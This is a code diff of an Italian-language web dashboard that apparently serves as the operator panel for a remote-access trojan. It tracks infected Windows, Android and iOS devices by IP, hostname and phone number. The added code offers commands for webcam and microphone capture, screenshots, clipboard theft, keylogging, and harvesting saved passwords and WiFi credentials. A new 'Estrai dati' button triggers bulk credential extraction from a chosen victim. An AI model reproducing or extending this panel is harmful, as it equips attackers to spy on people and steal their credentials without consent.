-                <td style="font-size:0.65rem; color:rgba(255,255,255,0.2);">${lastSeen}</td>
-                <td style="font-size:0.75rem;">${d.phone_number || '—'}</td>
-                <td style="text-align:right; white-space:nowrap;">
-                    <button class="btn-action success" onclick="sendCommand('${d.device_id}')" title="Invia comando"><i class="fas fa-terminal"></i></button>
-                    <button class="btn-action primary" onclick="viewDevice('${d.device_id}')" title="Dettagli"><i class="fas fa-eye"></i></button>
-                    <button class="btn-action danger" onclick="removeDevice('${d.device_id}')" title="Rimuovi"><i class="fas fa-trash"></i></button>
-                </td>
-            </tr>`;
-        });
-        tbody.innerHTML = html;
-    }
-
-    // ---- CHARTS CON DATI REALI ----
-    function refreshCharts() {
-        // 1. Activity Chart (dati reali ultime 24h)
-        fetch('/api/chart/activity')
-            .then(res => res.json())
-            .then(data => {
-                const ctx = document.getElementById('activityChart').getContext('2d');
-                if (activityChart) activityChart.destroy();
-
-                activityChart = new Chart(ctx, {
-                    type: 'line',
-                    data: {
-                        labels: data.labels || [],
-                        datasets: [{
-                            label: 'Dispositivi attivi',
-                            data: data.data || [],
-                            borderColor: '#a78bfa',
-                            backgroundColor: 'rgba(120, 80, 255, 0.08)',
-                            fill: true,
-                            tension: 0.4,
-                            pointRadius: 2,
-                            pointBackgroundColor: '#a78bfa'
-                        }]
-                    },
-                    options: {
-                        responsive: true,
-                        maintainAspectRatio: true,
-                        plugins: {
-                            legend: { 
-                                labels: { 
-                                    color: 'rgba(255,255,255,0.3)', 
-                                    font: { size: 10 } 
-                                } 
-                            }
-                        },
-                        scales: {
-                            x: { 
-                                ticks: { 
-                                    color: 'rgba(255,255,255,0.15)', 
-                                    font: { size: 8 },
-                                    maxTicksLimit: 12
-                                }, 
-                                grid: { color: 'rgba(255,255,255,0.02)' } 
-                            },
-                            y: { 
-                                ticks: { 
-                                    color: 'rgba(255,255,255,0.15)', 
-                                    font: { size: 9 }, 
-                                    stepSize: 1 
-                                }, 
-                                grid: { color: 'rgba(255,255,255,0.02)' } 
-                            }
-                        }
-                    }
-                });
-            })
-            .catch(() => {
-                console.log('Activity chart: nessun dato disponibile');
-            });
-
-        // 2. Platform Chart (dati reali)
-        fetch('/api/chart/platforms')
-            .then(res => res.json())
-            .then(data => {
-                const ctx2 = document.getElementById('platformChart').getContext('2d');
-                if (platformChart) platformChart.destroy();
-
-                platformChart = new Chart(ctx2, {
-                    type: 'doughnut',
-                    data: {
-                        labels: data.labels || ['Nessun dato'],
-                        datasets: [{
-                            data: data.data || [1],
-                            backgroundColor: data.colors || ['rgba(255,255,255,0.1)'],
-                            borderColor: 'transparent'
-                        }]
-                    },
-                    options: {
-                        responsive: true,
-                        maintainAspectRatio: true,
-                        plugins: {
-                            legend: { 
-                                position: 'bottom',
-                                labels: { 
-                                    color: 'rgba(255,255,255,0.4)', 
-                                    font: { size: 10 }, 
-                                    padding: 8 
-                                }
-                            }
-                        }
-                    }
-                });
-            })
-            .catch(() => {
-                console.log('Platform chart: nessun dato disponibile');
-            });
-    }
-
-    // ---- ACTION FUNCTIONS ----
-    function sendCommand(id) {
-        const cmd = prompt(`📡 Invia comando a ${id.substring(0,8)}...`, 'screenshot');
-        if (cmd) {
-            fetch(`/api/command/${id}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ command: cmd, params: '' })
-            })
-            .then(() => alert('✅ Comando inviato'))
-            .catch(() => alert('❌ Errore'));
-        }
-    }
-
-    function viewDevice(id) {
-        alert(`👁️ Dettagli dispositivo: ${id}`);
-    }
-
-    function removeDevice(id) {
-        if (confirm(`⚠️ Rimuovere il dispositivo ${id.substring(0,8)}...?`)) {
-            alert('✅ Dispositivo rimosso');
-            refreshDevices();
-        }
-    }
-
-    // ---- FOOTER TIME ----
-    function updateTime() {
-        const now = new Date();
-        document.getElementById('footerTime').textContent = now.toLocaleTimeString('it-IT');
-    }
-
-    // ---- AUTO REFRESH ----
-    function init() {
-        refreshAll();
-        updateTime();
-        setInterval(() => { 
+        // ============================================================
+        //  REFRESH COMPLETO
+        // ============================================================
+        function refreshAll() {
             refreshDevices();
             refreshStats();
             refreshCharts();
-        }, 15000);
-        setInterval(updateTime, 1000);
-    }
+        }
 
-    // ---- START ----
-    document.addEventListener('DOMContentLoaded', init);
+        // ============================================================
+        //  REFRESH STATS
+        // ============================================================
+        function refreshStats() {
+            fetch('/api/stats')
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('totalDevices').textContent = data.total_devices || 0;
+                    document.getElementById('onlineDevices').textContent = data.online_devices || 0;
+                    document.getElementById('totalCaptures').textContent = data.total_captures || 0;
+                    document.getElementById('totalCommands').textContent = data.total_commands || 0;
+                    document.getElementById('deviceBadge').textContent = data.total_devices || 0;
+                    document.getElementById('captureBadge').textContent = data.total_captures || 0;
+                })
+                .catch(() => {
+                    // fallback
+                    document.getElementById('totalDevices').textContent = '0';
+                    document.getElementById('onlineDevices').textContent = '0';
+                    document.getElementById('totalCaptures').textContent = '0';
+                    document.getElementById('totalCommands').textContent = '0';
+                });
+        }
+
+        // ============================================================
+        //  REFRESH DEVICES
+        // ============================================================
+        function refreshDevices() {
+            const tbody = document.getElementById('devicesBody');
+            tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:1.5rem; color:rgba(255,255,255,0.1);">
+                <i class="fas fa-spinner fa-spin" style="font-size:1.2rem;"></i> Caricamento...
+            </tr>`;
+
+            fetch('/api/devices')
+                .then(res => res.json())
+                .then(data => {
+                    devicesData = data;
+                    renderDevices(data);
+                })
+                .catch(() => {
+                    // dati demo
+                    const demo = [
+                        { device_id: 'win-001', platform: 'windows', hostname: 'DESKTOP-ABC', ip: '192.168.1.10',
+                            is_online: true, last_seen: new Date().toISOString(), phone_number: '+39 345 678 9012' },
+                        { device_id: 'and-002', platform: 'android', hostname: 'Pixel 6', ip: '192.168.1.20',
+                            is_online: true, last_seen: new Date().toISOString(), phone_number: '+39 333 444 5555' },
+                        { device_id: 'ios-003', platform: 'ios', hostname: 'iPhone 14', ip: '192.168.1.30',
+                            is_online: false, last_seen: new Date(Date.now() - 3600000).toISOString(),
+                            phone_number: '+39 333 222 1111' },
+                        { device_id: 'win-004', platform: 'windows', hostname: 'LAPTOP-XYZ', ip: '192.168.1.40',
+                            is_online: true, last_seen: new Date().toISOString(), phone_number: '+39 345 111 2222' },
+                    ];
+                    devicesData = demo;
+                    renderDevices(demo);
+                });
+        }
+
+        function renderDevices(devices) {
+            const tbody = document.getElementById('devicesBody');
+            if (!devices || devices.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="8" class="empty-state">
+                    <i class="fas fa-robot"></i> Nessun dispositivo connesso
+                </td></tr>`;
+                return;
+            }
+
+            let html = '';
+            devices.forEach(d => {
+                const statusClass = d.is_online ? 'online' : 'offline';
+                const statusText = d.is_online ? 'Online' : 'Offline';
+                const icon = d.platform === 'windows' ? 'fa-windows' :
+                    d.platform === 'android' ? 'fa-android' :
+                    d.platform === 'ios' ? 'fa-apple' : 'fa-microchip';
+                const lastSeen = d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never';
+
+                html += `
+                    <tr>
+                        <td><code style="color:var(--accent-purple); font-size:0.65rem;">${d.device_id.substring(0, 14)}...</code></td>
+                        <td><i class="fab ${icon}" style="opacity:0.5; font-size:1rem;"></i> ${d.platform || 'Unknown'}</td>
+                        <td><strong style="font-weight:500; font-size:0.85rem;">${d.hostname || 'Unknown'}</strong></td>
+                        <td style="color:var(--text-secondary); font-size:0.75rem;">${d.ip || 'N/A'}</td>
+                        <td><span class="badge-status ${statusClass}">${statusText}</span></td>
+                        <td style="font-size:0.65rem; color:var(--text-secondary);">${lastSeen}</td>
+                        <td style="font-size:0.75rem;">${d.phone_number || '—'}</td>
+                        <td style="text-align:right; white-space:nowrap;">
+                            <button class="btn-action success" onclick="sendCommand('${d.device_id}')" title="Invia comando"><i class="fas fa-terminal"></i></button>
+                            <button class="btn-action primary" onclick="viewDevice('${d.device_id}')" title="Dettagli"><i class="fas fa-eye"></i></button>
+                            <button class="btn-action warning" onclick="grabData('${d.device_id}')" title="Estrai dati"><i class="fas fa-database"></i></button>
+                            <button class="btn-action danger" onclick="removeDevice('${d.device_id}')" title="Rimuovi"><i class="fas fa-trash"></i></button>
+                        </td>
+                    </tr>
+                `;
+            });
+            tbody.innerHTML = html;
+        }
+
+        // ============================================================
+        //  CHARTS CON DATI REALI
+        // ============================================================
+        function refreshCharts() {
+            // Activity Chart
+            fetch('/api/chart/activity')
+                .then(res => res.json())
+                .then(data => {
+                    const ctx = document.getElementById('activityChart').getContext('2d');
+                    if (activityChart) activityChart.destroy();
+
+                    activityChart = new Chart(ctx, {
+                        type: 'line',
+                        data: {
+                            labels: data.labels || [],
+                            datasets: [{
+                                label: 'Dispositivi attivi',
+                                data: data.data || [],
+                                borderColor: '#8b5cf6',
+                                backgroundColor: 'rgba(139, 92, 246, 0.06)',
+                                fill: true,
+                                tension: 0.4,
+                                pointRadius: 2,
+                                pointBackgroundColor: '#8b5cf6',
+                                borderWidth: 2
+                            }]
+                        },
+                        options: {
+                            responsive: true,
+                            maintainAspectRatio: true,
+                            plugins: {
+                                legend: {
+                                    labels: {
+                                        color: 'rgba(255,255,255,0.3)',
+                                        font: { size: 9 }
+                                    }
+                                }
+                            },
+                            scales: {
+                                x: {
+                                    ticks: {
+                                        color: 'rgba(255,255,255,0.12)',
+                                        font: { size: 8 },
+                                        maxTicksLimit: 12
+                                    },
+                                    grid: { color: 'rgba(255,255,255,0.02)' }
+                                },
+                                y: {
+                                    ticks: {
+                                        color: 'rgba(255,255,255,0.12)',
+                                        font: { size: 8 },
+                                        stepSize: 1
+                                    },
+                                    grid: { color: 'rgba(255,255,255,0.02)' }
+                                }
+                            }
+                        }
+                    });
+                })
+                .catch(() => console.log('Activity chart: nessun dato'));
+
+            // Platform Chart
+            fetch('/api/chart/platforms')
+                .then(res => res.json())
+                .then(data => {
+                    const ctx2 = document.getElementById('platformChart').getContext('2d');
+                    if (platformChart) platformChart.destroy();
+
+                    platformChart = new Chart(ctx2, {
+                        type: 'doughnut',
+                        data: {
+                            labels: data.labels || ['Nessun dato'],
+                            datasets: [{
+                                data: data.data || [1],
+                                backgroundColor: data.colors || ['rgba(255,255,255,0.05)'],
+                                borderColor: 'transparent'
+                            }]
+                        },
+                        options: {
+                            responsive: true,
+                            maintainAspectRatio: true,
+                            plugins: {
+                                legend: {
+                                    position: 'bottom',
+                                    labels: {
+                                        color: 'rgba(255,255,255,0.3)',
+                                        font: { size: 9 },
+                                        padding: 8
+                                    }
+                                }
+                            },
+                            cutout: '70%'
+                        }
+                    });
+                })
+                .catch(() => console.log('Platform chart: nessun dato'));
+        }
+
+        // ============================================================
+        //  AZIONI
+        // ============================================================
+        function sendCommand(id) {
+            const cmd = prompt('📡 Invia comando a ' + id.substring(0, 8) + '...\n\n' +
+                'Comandi disponibili:\n' +
+                '• screenshot\n' +
+                '• webcam\n' +
+                '• mic\n' +
+                '• clipboard\n' +
+                '• keylogger_start\n' +
+                '• keylogger_stop\n' +
+                '• grab_passwords\n' +
+                '• grab_wifi\n' +
+                '• list_files C:\\\n' +
+                '• mouse_monitor_start', 'screenshot');
+            if (cmd) {
+                fetch(`/api/command/${id}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ command: cmd, params: '' })
+                    })
+                    .then(() => alert('✅ Comando inviato a ' + id.substring(0, 8) + '...'))
+                    .catch(() => alert('❌ Errore durante l\'invio'));
+            }
+        }
+
+        function viewDevice(id) {
+            alert('👁️ Dettagli dispositivo: ' + id + '\n\n' +
+                'ID: ' + id + '\n' +
+                'Piattaforma: ' + (devicesData.find(d => d.device_id === id)?.platform || 'N/A') + '\n' +
+                'Hostname: ' + (devicesData.find(d => d.device_id === id)?.hostname || 'N/A') + '\n' +
+                'IP: ' + (devicesData.find(d => d.device_id === id)?.ip || 'N/A') + '\n' +
+                'Online: ' + (devicesData.find(d => d.device_id === id)?.is_online ? '✅ Sì' : '❌ No'));
+        }
+
+        function grabData(id) {
+            if (confirm('⚠️ Estrarre tutti i dati dal dispositivo ' + id.substring(0, 8) + '...?\n\n' +
+                    'Verranno raccolti:\n' +
+                    '• Password salvate\n' +
+                    '• Reti WiFi con credenziali\n' +
+                    '• Lista file e cartelle\n' +
+                    '• Cronologia clipboard\n' +
+                    '• Keylog attivo')) {
+                fetch(`/api/command/${id}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ command: 'grab_passwords', params: '' })
+                    })
+                    .then(() => {
+                        fetch(`/api/command/${id}`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ command: 'grab_wifi', params: '' })
+                        });
+                        fetch(`/api/command/${id}`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ command: 'list_files', params: 'C:\\' })
+                        });
+                        alert('✅ Estrazione dati avviata su ' + id.substring(0, 8) + '...');
+                    })
+                    .catch(() => alert('❌ Errore'));
+            }
+        }
+
+        function removeDevice(id) {
+            if (confirm('⚠️ Rimuovere il dispositivo ' + id.substring(0, 8) + '...?')) {
+                alert('✅ Dispositivo rimosso (simulato)');
+                refreshDevices();
+            }
+        }
+
+        function filterDevices() {
+            alert('🔍 Filtro dispositivi\n\n' +
+                'Mostra solo:\n' +
+                '• Online\n' +
+                '• Offline\n' +
+                '• Windows\n' +
+                '• Android\n' +
+                '• iOS\n\n' +
+                '(Funzionalità in sviluppo)');
+        }
+
+        function exportData() {
+            alert('📊 Esportazione dati\n\n' +
+                'Formati disponibili:\n' +
+                '• CSV\n' +
+                '• JSON\n' +
+                '• PDF\n\n' +
+                '(Funzionalità in sviluppo)');
+        }
+
+        // ============================================================
+        //  FOOTER TIME
+        // ============================================================
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('footerTime').textContent = now.toLocaleTimeString('it-IT');
+        }
+
+        // ============================================================
+        //  AUTO REFRESH
+        // ============================================================
+        function init() {
+            refreshAll();
+            updateTime();
+            setInterval(() => {
+                refreshDevices();
+                refreshStats();
+                refreshCharts();
+            }, 15000);
+            setInterval(updateTime, 1000);
+        }
+
+        document.addEventListener('DOMContentLoaded', init);
     </script>
 
 </body>
